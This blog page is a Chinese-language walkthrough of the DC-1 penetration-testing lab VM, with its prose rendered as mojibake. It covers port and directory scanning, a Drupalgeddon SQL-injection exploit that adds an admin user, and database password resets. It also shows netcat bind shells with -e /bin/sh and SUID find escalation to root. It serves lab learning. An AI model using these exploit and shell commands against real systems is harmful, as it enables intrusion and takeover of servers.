<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Here recording my growth of technology and hope you can gain something here."><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>Welcome to my blog. | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">98</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/">æ¸—é€é¶æœºæ€»ç»“</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time><div class="content"><h1 id="Dc1"><a href="#Dc1" class="headerlink" title="Dc1"></a>Dc1</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.33.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">80&#x2F;tcp  open  http</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:34:9E:E8 (VMware)</span><br></pre></td></tr></table></figure>

<p>ipï¼š192.168.33.136</p>
<p>ç«¯å£ï¼š</p>
<p>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind</p>
<p>22ï¼šè¯•ç€å°è¯•sshå…å¯†ç™»å½•ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>è¿™é‡Œå¯ä»¥hydraçˆ†ç ´ä¸€æ³¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>80ï¼šç›´æ¥è®¿é—®ç½‘é¡µ</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/1-1.png" alt="1-1"></p>
<p>ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[08:46:04] 200 -    1KB - &#x2F;COPYRIGHT.txt                                   </span><br><span class="line">[08:46:14] 200 -   17KB - &#x2F;INSTALL                           </span><br><span class="line">[08:46:15] 200 -    1KB - &#x2F;INSTALL.mysql.txt</span><br><span class="line">[08:46:15] 200 -    2KB - &#x2F;INSTALL.pgsql.txt</span><br><span class="line">[08:46:15] 200 -   17KB - &#x2F;INSTALL.txt</span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE                         </span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE.txt</span><br><span class="line">[08:46:16] 200 -    8KB - &#x2F;MAINTAINERS.txt                 </span><br><span class="line">[08:46:22] 200 -    5KB - &#x2F;README                    </span><br><span class="line">[08:46:23] 200 -    5KB - &#x2F;README.txt                 </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE                                         </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE.txt</span><br><span class="line">[08:51:42] 301 -  319B  - &#x2F;includes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;includes&#x2F;    </span><br><span class="line">[08:51:46] 200 -    7KB - &#x2F;index.php                      </span><br><span class="line">[08:52:37] 301 -  315B  - &#x2F;misc  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;misc&#x2F;</span><br><span class="line">[08:52:41] 301 -  318B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;modules&#x2F;</span><br><span class="line">[08:52:57] 200 -    7KB - &#x2F;node                                             </span><br><span class="line">[08:53:50] 301 -  319B  - &#x2F;profiles  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;profiles&#x2F;</span><br><span class="line">[08:54:06] 200 -    2KB - &#x2F;robots.txt                     </span><br><span class="line">[08:54:11] 301 -  318B  - &#x2F;scripts  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;scripts&#x2F;</span><br><span class="line">[08:54:31] 301 -  316B  - &#x2F;sites  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;sites&#x2F;</span><br><span class="line">[08:54:32] 200 -  952B  - &#x2F;sites&#x2F;all&#x2F;modules&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -    0B  - &#x2F;sites&#x2F;example.sites.php</span><br><span class="line">[08:54:32] 200 -  904B  - &#x2F;sites&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -  767B  - &#x2F;sites&#x2F;all&#x2F;themes&#x2F;README.txt</span><br><span class="line">[08:55:04] 301 -  317B  - &#x2F;themes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;themes&#x2F;      </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user                                </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user&#x2F;                     </span><br><span class="line">[08:55:23] 200 -    7KB - &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">[08:55:37] 200 -    2KB - &#x2F;web.config                  </span><br><span class="line">[08:55:58] 200 -   42B  - &#x2F;xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:    http:&#x2F;&#x2F;example.com&#x2F;robots.txt</span><br><span class="line"># Ignored: http:&#x2F;&#x2F;example.com&#x2F;site&#x2F;robots.txt</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html</span><br><span class="line">#</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>msfconsole:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use   å¯¹åº”æ¨¡å—</span><br><span class="line">show options  æŸ¥çœ‹ä¿¡æ¯</span><br><span class="line">set rhosts  è¿œç¨‹ä¸»æœºip</span><br><span class="line">run   æ”»å‡»</span><br><span class="line">exploit æ”»å‡»</span><br><span class="line"></span><br><span class="line">shell 	æ‹¿åˆ°æƒé™</span><br></pre></td></tr></table></figure>



<p>ä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shellã€æ–¹ä¾¿åç»­æ“ä½œã€‘</p>
<blockquote>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>shell #æƒé™ï¼Œä¸æ˜¯æœ¬åœ°ï¼Œæ˜¯httpé“¾æ¥ï¼Œéœ€è¦ä¸€ä¸ªæŒä¹…é“¾æ¥ï¼Œåå¼¹ä¸€ä¸ªäº¤äº’shell</p>
<p>python -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)â€</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>find /var/www/test -exec nc -lvp 9999 -e /bin/sh ;</p>
<p>nc 192.168.0.119 9999</p>
</blockquote>
<p>/var/www/profiles/testing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &quot;7.24&quot;</span><br><span class="line">project &#x3D; &quot;drupal&quot;</span><br><span class="line">datestamp &#x3D; &quot;1384983240&quot;</span><br></pre></td></tr></table></figure>





<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥æ•°æ®åº“ï¼ŒæŸ¥çœ‹usersè¡¨ï¼Œå‘ç°adminçš„å¯†ç è¢«åŠ å¯†ã€‚</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><strong>æ–¹æ³•ä¸€ï¼š</strong>ã€ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ã€‘</p>
<p>æŸ¥çœ‹å®˜ç½‘æ–‡æ¡£+StackOverflow</p>
<p>å‘ç°mysqlåŠ å¯†è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts&#x2F;password-hash.sh &#39;pass&#39;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line">php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line"></span><br><span class="line">password: passwd                hash: $S$DYUw2bI4eMoDktLEjoauViDb4yDZCQBI0bA7yoJa3oZNRHcZQgQH</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh ppap</span><br><span class="line">php scripts&#x2F;password-hash.sh ppap</span><br><span class="line"></span><br><span class="line">password: ppap          hash: $S$DCKCzF&#x2F;33eff52x&#x2F;Po.lQ5bYwDBAy8oVs&#x2F;8mZ7.GNaXFkjxyixXi</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬è™½ç„¶ä¸èƒ½è§£å¯†å¯†ç å¯æ˜¯å¯ä»¥æ›´æ–°ç®¡ç†å‘˜çš„å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users SET pass&#x3D;&#39;$S$D5iUQJACoD2gCDtE0WaoCMmsoNPVD7Q84aXuHjuoIKwHhD9aKh9Z&#39; where name&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>





<p><strong>æ–¹æ³•äºŒï¼š</strong>ã€æ·»åŠ å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æŸ¥çœ‹å…·ä½“ç‰ˆæœ¬</span><br><span class="line">cat includes&#x2F;bootstrap.inc | grep VERSION</span><br><span class="line">define(&#39;VERSION&#39;, &#39;7.24&#39;);</span><br><span class="line">      $has_openssl &#x3D; version_compare(PHP_VERSION, &#39;5.3.4&#39;, &#39;&gt;&#x3D;&#39;) &amp;&amp; function_exists(&#39;openssl_random_pseudo_bytes&#39;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                          | php&#x2F;webapps&#x2F;34992.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                           | php&#x2F;webapps&#x2F;44355.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                | php&#x2F;webapps&#x2F;34984.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                | php&#x2F;webapps&#x2F;34993.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                   | php&#x2F;webapps&#x2F;35150.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€AGsite)-[&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps]</span><br><span class="line">â””â”€# python 34992.py -t http:&#x2F;&#x2F;192.168.33.136 -u userAG -p 123456</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> flag3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</span><br></pre></td></tr></table></figure>







<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>åœ¨/etc/passwdé‡Œæ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>





<h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>ä¼°è®¡æ˜¯è¦ææƒäº†</p>
<blockquote>
<p>ã€SUIDææƒã€‘</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -user root -perm -4000 -exec ls -ldb { }</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;pt_chown</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;sbin&#x2F;mount.nfs</span><br></pre></td></tr></table></figure>



<p>å‘ç°å¯ä»¥findææƒ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;whoami&quot; \;                                                           </span><br><span class="line">find -name flag4.txt -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>





<p><strong>æ³•ä¸€ï¼šã€ç›´æ¥ææƒã€‘</strong></p>
<p>ææƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>å³å¯æ‰“å¼€finalflag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>





<p><strong>æ³•äºŒï¼šã€æå‡netcatæƒé™ã€‘</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">&lt;find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;                       </span><br><span class="line">listening on [any] 2233 ...</span><br><span class="line">192.168.33.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.33.136] from (UNKNOWN) [192.168.33.128] 49168</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¦å¤–ä¸€ä¸ªæ²¡æœ‰msfconsoleçš„ç»ˆç«¯ï¼š</span><br><span class="line">netcat 192.168.33.136 2233</span><br><span class="line"></span><br><span class="line">ä¹‹åæ­£å¸¸æ‰§è¡Œå°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure>











<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-1.png" alt="2-1"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -v 192.168.33.137 		&#x2F;&#x2F;-væ˜¯å¢å¼ºæœç´¢æ•ˆæœï¼Œ-vvæ›´å¼º</span><br></pre></td></tr></table></figure>

